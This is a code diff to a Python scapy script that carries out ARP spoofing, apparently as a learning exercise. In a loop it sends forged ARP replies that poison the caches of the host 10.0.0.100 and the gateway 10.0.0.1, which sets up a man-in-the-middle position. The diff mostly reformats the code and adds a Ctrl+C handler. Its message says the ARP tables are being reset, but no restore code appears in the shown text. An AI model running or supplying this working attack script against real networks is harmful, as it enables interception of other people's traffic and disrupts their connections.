@@ -1,11 +1,12 @@
 import time
+
 import scapy.all as scapy
 
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    combined_packet = broadcast/arp_request
+    combined_packet = broadcast / arp_request
     answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
@@ -21,10 +22,14 @@ def spoof(target_ip, spoof_ip):
 
 
 count = 0
-while True:
-    spoof("10.0.0.100", "10.0.0.1")
-    spoof("10.0.0.1", "10.0.0.100")
-    count += 2
-    print("[+] packets sent: " + str(count))
-
-    time.sleep(2)
+try:
+    while True:
+        spoof("10.0.0.100", "10.0.0.1")
+        spoof("10.0.0.1", "10.0.0.100")
+        count += 2
+        # \r is used to print on the same line
+        # dynamic printing
+        print("\r[+] packets sent: " + str(count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C .... Resetting ARP tables.... Please wait.")
